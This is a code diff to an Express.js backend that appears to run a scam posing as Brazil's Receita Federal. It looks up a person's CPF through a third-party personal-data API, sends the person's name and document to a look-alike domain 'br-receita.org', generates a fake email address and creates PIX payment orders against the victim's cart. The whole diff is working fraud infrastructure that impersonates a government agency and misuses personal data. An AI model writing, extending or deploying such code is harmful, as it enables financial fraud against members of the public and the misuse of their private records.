@@ -48,6 +48,7 @@ app.use(express_1.default.json());
 app.use((0, cors_1.default)({
     origin: '*'
 }));
+app.set('trust proxy', 1);
 const consultaRouter = (0, express_1.Router)();
 const cpfLimiter = (0, express_rate_limit_1.default)({
     windowMs: 60 * 1000, // 15 minutos
@@ -56,9 +57,53 @@ const cpfLimiter = (0, express_rate_limit_1.default)({
     legacyHeaders: false, // desativa X-RateLimit-* headers
 });
 const cpfConsulta = async (req, res, next) => {
-    const { cpf } = req.params;
+    const { cpf, cartId } = req.params;
     try {
-        const apiUrl = `https://datagetapi.online/api/v1/cpf/${cpf}`;
+        const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
+        const upstream = await fetch(apiUrl, { method: 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${process.env.CPF_TOKEN}`
+            }
+        });
+        if (!upstream.ok) {
+            return res
+                .status(upstream.status)
+                .json({ error: `Upstream retornou ${upstream.status}` });
+        }
+        const data = await upstream.json();
+        const getOrder = await fetch(`https://api-regularizar.br-receita.org/cart/${cartId}/customer`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                Accept: 'application/json',
+            },
+            body: JSON.stringify({
+                name: data.NOME,
+                document: data.CPF,
+                document_type: 'CPF',
+                email: `${data.NOME.normalize('NFD')
+                    .replace(/[\u0300-\u036f]/g, '')
+                    .replace(/\s+/g, '')
+                    .replace(/[^a-zA-Z0-9]/g, '')
+                    .toLowerCase()}@sememail.com`,
+            })
+        });
+        if (!getOrder.ok) {
+            return res
+                .status(getOrder.status)
+                .json({ error: `Payment API retornou ${getOrder.status}` });
+        }
+        return res.json(data);
+    }
+    catch (err) {
+        next(err);
+    }
+};
+const cpf = async (req, res, next) => {
+    const { cpf, cartId } = req.params;
+    try {
+        const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
         const upstream = await fetch(apiUrl, { method: 'GET',
             headers: {
                 'Content-Type': 'application/json',
@@ -77,13 +122,43 @@ const cpfConsulta = async (req, res, next) => {
         next(err);
     }
 };
-consultaRouter.get('/:cpf', cpfLimiter, cpfConsulta);
+const getCartByPlan = async (req, res, next) => {
+    console.log('error');
+    try {
+        const paymentRes = await fetch('https://api-regularizar.br-receita.org/r/QU0tNjgwZjdmOTg3M2QwMg', {
+            method: 'GET',
+            headers: {
+                'Accept': 'application/json',
+            }
+        });
+        console.log(paymentRes);
+        if (!paymentRes.ok) {
+            return res
+                .status(paymentRes.status)
+                .json({ error: `Payment API retornou ${paymentRes.status}` });
+        }
+        const cartId = (await paymentRes.text()).trim();
+        return res.json({
+            cartId
+        });
+    }
+    catch (err) {
+        return res.json(err);
+    }
+};
+consultaRouter.get('/:cpf/:cartId', cpfLimiter, cpf);
 app.use('/', consultaRouter);
+const customerRouter = (0, express_1.Router)();
+customerRouter.get('/:cpf/:cartId', cpfLimiter, cpfConsulta);
+app.use('/customer', customerRouter);
+const cartRouter = (0, express_1.Router)();
+cartRouter.get('/cart', getCartByPlan);
+app.use('/', cartRouter);
 const paymentRouter = (0, express_1.Router)();
 const payment = async (req, res, next) => {
-    const { cpf } = req.params;
+    const { cpf, cartId } = req.params;
     try {
-        const apiUrl = `https://datagetapi.online/api/v1/cpf/${cpf}`;
+        const apiUrl = `https://api.dataget.site/api/v1/cpf/${cpf}`;
         const upstream = await fetch(apiUrl, { method: 'GET',
             headers: {
                 'Content-Type': 'application/json',
@@ -96,42 +171,20 @@ const payment = async (req, res, next) => {
                 .json({ error: `Upstream retornou ${upstream.status}` });
         }
         const data = await upstream.json();
-        const paymentRes = await fetch('https://regularizar.br-receita.org/r/QU0tNjgwZjdmOTg3M2QwMg', {
-            method: 'GET',
-            headers: {
-                'Accept': 'application/json',
-            }
-        });
-        if (!paymentRes.ok) {
-            return res
-                .status(paymentRes.status)
-                .json({ error: `Payment API retornou ${paymentRes.status}` });
-        }
-        const cartId = (await paymentRes.text()).trim();
         const orderPayload = {
             payment_method: 'pix',
             customer: {
-                name: data.NAME || 'Nome Exemplo',
-                email: 'customer@sememail.com',
+                name: data.NOME || 'Nome Exemplo',
+                email: `${data.NOME.normalize('NFD') // separa caracteres e diacríticos
+                    .replace(/[\u0300-\u036f]/g, '') // tira os acentos
+                    .replace(/\s+/g, '') // tira espaços
+                    .replace(/[^a-zA-Z0-9]/g, '') // tira caracteres especiais
+                    .toLowerCase()}@sememail.com`,
                 document: cpf,
                 document_type: 'CPF'
             }
         };
-        const getOrder = await fetch(`https://api-tenant.ads-information.top/cart/${cartId}`, {
-            method: 'GET',
-            headers: {
-                'Content-Type': 'application/json',
-                Accept: 'application/json',
-            },
-        });
-        if (!getOrder.ok) {
-            return res.status(getOrder.status).json({ error: `Order APIsd retornou ${getOrder.status}` });
-        }
-        const getOrderData = await getOrder.json();
-        if (getOrderData.completedOrders[0] && getOrderData.completedOrders[0].paid) {
-            return res.json(getOrderData);
-        }
-        const orderRes = await fetch(`https://api-tenant.ads-information.top/cart/${cartId}/order?`, {
+        const orderRes = await fetch(`https://api-regularizar.br-receita.org/cart/${cartId}/order?`, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
@@ -150,7 +203,7 @@ const payment = async (req, res, next) => {
         next(err);
     }
 };
-paymentRouter.get('/:cpf', payment);
+paymentRouter.get('/:cpf/:cartId', payment);
 app.use("/payment", paymentRouter);
 app.listen(port, () => {
     console.log(`🚀 Server rodando em http://localhost:${port}`);
